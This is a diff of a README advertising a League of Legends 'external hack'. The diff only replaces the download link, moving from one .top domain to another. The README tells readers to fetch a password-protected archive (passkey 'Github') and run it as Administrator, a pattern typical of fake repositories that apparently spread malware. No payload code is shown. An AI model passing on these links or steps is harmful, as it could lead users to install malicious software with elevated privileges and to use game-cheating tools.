@@ -6,7 +6,7 @@ League of Legends external hack with auto-accept, auto-pick, auto-ban, skin chan
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -76,7 +76,7 @@ Key technologies used:
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Launch League of Legends client and log in.
 3. Run the hack **as Administrator**.
 4. Wait for confirmation that the tool connected to the LCU API.
